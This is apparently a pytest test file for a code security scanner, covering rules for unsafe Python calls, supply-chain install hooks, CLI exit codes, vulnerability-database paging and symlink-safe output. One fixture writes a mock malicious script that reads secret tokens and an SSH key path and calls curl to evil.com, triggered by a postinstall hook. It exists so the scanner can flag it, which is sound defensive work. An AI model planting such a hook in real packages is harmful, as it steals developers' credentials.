import json
from pathlib import Path

from seculens import analyze, fetch_database
from seculens.cli import main

ROOT = Path(__file__).resolve().parents[1]


def test_ast_aliases_safe_calls_complexity_and_no_execution(tmp_path):
    sentinel = tmp_path / "executed"
    (tmp_path / "code.py").write_text(f"""from subprocess import run as execute
import pickle as p
import yaml as y
from yaml import SafeLoader as safe
open({str(sentinel)!r}, "w").write("bad")
execute("x", shell=True)
execute(["x"], shell=False)
p.loads(b"x")
y.load("x", Loader=safe)
y.load("x")
eval("x")
def deep(x):
    if x:
        if x:
            if x:
                if x:
                    if x:
                        return x
""")
    results = analyze(tmp_path)
    rules = [f["ruleId"] for f in results]
    assert sorted(rules) == sorted(
        [
            "PY-SUBPROCESS-SHELL",
            "PY-CHILD-PROCESS",
            "PY-PICKLE",
            "PY-YAML-LOAD",
            "PY-DYNAMIC-EXECUTION",
            "PY-COMPLEXITY",
        ]
    )
    assert not sentinel.exists()
    assert all(f.get("line") for f in results)
    assert "nesting=5" in next(f["evidence"] for f in results if f["category"] == "quality")


def test_supply_chain_analysis_and_lifecycle_scripts(tmp_path):
    (tmp_path / "malicious.py").write_text("""import os
import subprocess

token = os.environ.get("NPM_TOKEN")
token2 = os.getenv("SECRET_KEY")
key_path = "/home/user/.ssh/id_rsa"
subprocess.run(["curl", "evil.com"])
""")
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "sc-pkg",
        "scripts": {"postinstall": "python malicious.py"}
    }))
    (tmp_path / "package-lock.json").write_text(json.dumps({
        "packages": {
            "node_modules/bad-lib": {"version": "2.0.0", "hasInstallScript": True}
        }
    }))
    results = analyze(tmp_path)
    rules = [f["ruleId"] for f in results]
    assert "PY-PROCESS-ENV" in rules
    assert "PY-SENSITIVE-PATH" in rules
    assert "PY-CHILD-PROCESS" in rules
    assert "SC-LIFECYCLE-SCRIPT" in rules
    assert len([f for f in results if f["ruleId"] == "SC-LIFECYCLE-SCRIPT"]) == 2


def test_parse_errors_encoding_and_ignored_symlinks(tmp_path):
    (tmp_path / "bad.py").write_text("def broken(:")
    (tmp_path / "latin.py").write_bytes(b"# coding: latin-1\n# caf\xe9\neval('x')\n")
    (tmp_path / ".venv").mkdir()
    (tmp_path / ".venv/ignored.py").write_text("eval('x')")
    (tmp_path / "linked.py").symlink_to(tmp_path / "latin.py")
    results = analyze(tmp_path)
    assert len(results) == 2
    assert {f["ruleId"] for f in results} == {"PY-PARSE-ERROR", "PY-DYNAMIC-EXECUTION"}


def test_cli_offline_evidence_and_statuses(tmp_path):
    base = [
        "scan",
        str(ROOT / "examples/cyclonedx.json"),
        "--db",
        str(ROOT / "examples/database.json"),
        "--policy",
        str(ROOT / "examples/policy.json"),
        "-o",
        str(tmp_path),
    ]
    assert main(base) == 0
    report = json.loads((tmp_path / "report.json").read_text())
    assert report["database"]["source"] == "database.json"
    assert (tmp_path / "report.docx").exists()
    assert main([*base, "--fail-on-findings"]) == 1
    data = json.loads((ROOT / "examples/cyclonedx.json").read_text())
    data["components"][0].pop("purl")
    source = tmp_path / "incomplete.json"
    source.write_text(json.dumps(data))
    base[1] = str(source)
    assert main(base) == 2
    assert main(["scan", "does-not-exist", "--db", "missing"]) == 2


def test_osv_fetch_pagination_and_no_version_sent(monkeypatch):
    calls = []

    class Response:
        def raise_for_status(self):
            pass

        def json(self):
            return {
                "vulns": [{"id": "A", "affected": []}],
                **({"next_page_token": "p2"} if len(calls) == 1 else {}),
            }

    class Session:
        def __enter__(self):
            return self

        def __exit__(self, *args):
            pass

        def post(self, url, **kwargs):
            calls.append(kwargs["json"])
            return Response()

    monkeypatch.setattr("seculens.database.requests.Session", Session)
    records = fetch_database([{"ecosystem": "PyPI", "name": "demo", "version": "1.0"}] * 2)
    assert len(records) == 1
    assert calls == [
        {"package": {"name": "demo", "ecosystem": "PyPI"}},
        {"package": {"name": "demo", "ecosystem": "PyPI"}, "page_token": "p2"},
    ]


def test_report_output_does_not_follow_symlinks(tmp_path):
    sentinel = tmp_path / "private.txt"
    sentinel.write_text("DO NOT CHANGE")
    for name in ("sbom.json", "database.json", "report.json", "report.docx"):
        (tmp_path / name).symlink_to(sentinel)
    assert (
        main(
            [
                "scan",
                str(ROOT / "examples/cyclonedx.json"),
                "--db",
                str(ROOT / "examples/database.json"),
                "-o",
                str(tmp_path),
            ]
        )
        == 0
    )
    assert sentinel.read_text() == "DO NOT CHANGE"
    for name in ("sbom.json", "database.json", "report.json", "report.docx"):
        assert not (tmp_path / name).is_symlink()
        assert (tmp_path / name).stat().st_mode & 0o077 == 0
